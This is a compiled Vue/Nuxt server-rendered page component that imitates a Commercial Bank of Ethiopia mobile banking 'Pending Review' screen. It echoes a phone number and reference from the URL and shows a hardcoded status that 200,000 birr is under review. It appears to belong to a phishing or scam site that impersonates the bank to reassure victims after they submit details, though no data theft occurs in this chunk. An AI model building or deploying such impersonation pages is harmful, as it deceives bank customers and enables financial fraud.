globalThis.__timing__.logStart('Load chunks/build/review-DGzgvZ5V');import { defineComponent, computed, mergeProps, unref, useSSRContext } from 'vue';
import { ssrRenderAttrs, ssrRenderAttr, ssrInterpolate } from 'vue/server-renderer';
import { _ as _imports_0 } from './virtual_public-GXG8ACDz.mjs';
import { d as useRoute } from './server.mjs';
import '../routes/renderer.mjs';
import 'vue-bundle-renderer/runtime';
import '../nitro/nitro.mjs';
import 'node:http';
import 'node:https';
import 'node:events';
import 'node:buffer';
import 'node:fs';
import 'node:path';
import 'node:crypto';
import 'unhead/server';
import 'devalue';
import 'unhead/utils';
import 'vue-router';

const _sfc_main = /* @__PURE__ */ defineComponent({
  __name: "review",
  __ssrInlineRender: true,
  setup(__props) {
    const route = useRoute();
    const displayPhone = computed(() => {
      const phone = route.query.phone;
      return typeof phone === "string" && phone.trim() ? phone : "not provided";
    });
    const displayReference = computed(() => {
      const reference = route.query.reference;
      return typeof reference === "string" && reference.trim() ? reference : "not provided";
    });
    return (_ctx, _push, _parent, _attrs) => {
      _push(`<main${ssrRenderAttrs(mergeProps({ class: "mobile-screen" }, _attrs))}><header class="topbar"><div><p class="app-title">CBE Mobile Banking</p><p class="app-subtitle">Review status</p></div><div class="topbar-actions" aria-label="Quick actions"><button class="icon-button" type="button" aria-label="Notifications"><span class="bell-icon"></span></button><button class="lang-pill" type="button" aria-label="Current language"> EN </button></div></header><section class="hero-card"><div class="logo-wrap" aria-label="Commercial Bank of Ethiopia logo"><img class="logo-image"${ssrRenderAttr("src", _imports_0)} alt="Commercial Bank of Ethiopia logo"></div><div class="hero-copy"><h1>Pending Review</h1><p class="brand-name">Your verification is under review</p><p class="greeting">Expected review time: within 5 hours</p></div><p class="helper-text"> Your request has been received successfully and is currently pending for review. You will be contacted after the review window is complete. </p><div class="summary-card"><p><strong>Phone:</strong> ${ssrInterpolate(unref(displayPhone))}</p><p><strong>Reference:</strong> ${ssrInterpolate(unref(displayReference))}</p><p><strong>Status:</strong> 200,000birr is under Pending review</p></div><button class="secondary-link" type="button"> Return to home </button></section><footer class="bottom-panel"><div class="chat-row"><span>Need help with review status?</span><button class="chat-pill" type="button">Support</button></div><button class="service-button" type="button"><span class="service-icon">◌</span><span>Review Services</span></button><p class="copyright">Copyright © Commercial Bank Of Ethiopia</p></footer></main>`);
    };
  }
});
const _sfc_setup = _sfc_main.setup;
_sfc_main.setup = (props, ctx) => {
  const ssrContext = useSSRContext();
  (ssrContext.modules || (ssrContext.modules = /* @__PURE__ */ new Set())).add("pages/review.vue");
  return _sfc_setup ? _sfc_setup(props, ctx) : void 0;
};

export { _sfc_main as default };;globalThis.__timing__.logEnd('Load chunks/build/review-DGzgvZ5V');
//# sourceMappingURL=review-DGzgvZ5V.mjs.map
